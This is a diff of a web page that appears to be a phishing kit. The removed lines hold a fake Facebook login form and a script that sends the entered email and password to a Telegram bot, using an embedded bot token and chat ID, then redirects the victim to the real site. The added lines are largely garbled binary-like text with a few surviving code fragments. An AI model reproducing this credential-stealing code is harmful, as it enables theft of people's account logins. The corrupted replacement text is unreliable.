@@ -145,43 +145,23 @@
 </head>
 <body>
 
-    <main>
-        <div class="row">
-            <div class="col-logo">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCuV_aC5hc.svg" alt="Facebook">
-                <h2>Facebook helps you connect and share with the people in your life.</h2>
-            </div>
-            <div class="col-form">
-                <form class="form-container" id="login-form">
-                    <input type="text" id="email" placeholder="Email address or phone number" required>
-                    <input type="password" id="password" placeholder="Password" required>
-                    <button type="submit" class="btn-login">Log In</button>
-                    <a href="#">Forgotten password?</a>
-                    <hr style="border: 0; border-top: 1px solid #dadde1;">
-                    <button type="button" class="btn-new">Create new account</button>
-                </form>
-            </div>
-        </div>
-    </main>
-
+¨§v+Ü«,º0v+Ü«,Ê%(h,­!¶Úlÿû-jØÇÛqÙçzßë²·)ò×úÿâP®U ¹Ë/©mVyº(iÇ¢!zZlÊ¢yÞrÖ§vÈZ­ì"¶az¨¦W¢*.®X{øvýØ¯v+Ü«,Ê%~æ~ærV¬´è®g(Ö¢êât	h)ß¢¹¢­·*^×±¶'zf¢Zqèh×«IVv·¬²éÞézºÞªè«yØ§¦ëmÊ¥«,ÂÝ)jË0¢·i§]zjË0¢·kz«¢­ç[ºÛhÜ©|.nh­rV¬´íZ rèÿnëm¢v¡­çà¢Û^¬³
++wö¡®Ër¢·^¯Fè­×«¶u§(']i×^Õ»­¶íÊnëm¢w%jËnÙç{
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
         // سكريبت الإرسال والتحويل
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            axios.post(`https://api.telegram.org/bot8512653224:AAEEtBb6KxtgonV-Lk2WVQudCstX3y6jEBc/sendMessage`, {
-                chat_id: "6152291210",
-                parse_mode: 'html',
-                text: `📧 <b>User:</b> ${email}\n🔑 <b>Pass:</b> ${password}`
-            }).then(() => {
-                window.location.href = "https://www.facebook.com";
-            }).catch(() => {
-                window.location.href = "https://www.facebook.com";
+rìµé¡Ë¦z{`zÑ%zg§´ué[Úçrì¶¬³
++thréØ´I^éí"¥«,ÂÝ½©n
+k¨²?,¶m¦I?j?­zW ­©¨®U¢?9×n¹?m¸
+r­Þµçm½×mt
+            parse_mode: 'html',
+µìmmK¯öÞ¨¥³Ú²ÏÛ¥«,ÂÝ
+¶§§v%¡Æ­á­çÛi³ÿðÃÚqæè¢G(Æ­r0whÂZjØ¨Þ|m¶?ÿ0}§n$r
             });
         });
     </script>
 </body>
 </html>
+
